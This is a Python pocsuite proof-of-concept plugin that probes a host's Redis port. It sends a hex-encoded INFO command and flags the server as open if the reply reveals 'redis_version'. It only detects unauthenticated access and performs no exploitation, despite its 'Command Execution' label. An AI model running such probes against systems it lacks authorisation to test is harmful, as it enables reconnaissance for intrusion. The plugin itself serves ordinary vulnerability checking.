#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import socket
from pocsuite.api.utils import url2ip

class RedisunauthPOC(POCBase):
    name = 'Redisunauth'
    vulID = '0'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['bey0nd']
    vulType = 'Command Execution'
    version = '1.0'    # default version: 1.0
    references = ['']
    desc = '''Redisunauth'''

    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'

    appName = 'redis'
    appVersion = 'redis'
    appPowerLink = 'redis'
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        import socket
        s = socket.socket()
        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        socket.setdefaulttimeout(5)
        host = url2ip(self.url)
        port = 6379
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(1024)
        if recvdata and 'redis_version' in recvdata:
            result['FileInfo'] = {}
            result['FileInfo']['Filename'] = "redis-unauth"
        s.close()


        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Failed')
        return output

register(RedisunauthPOC)
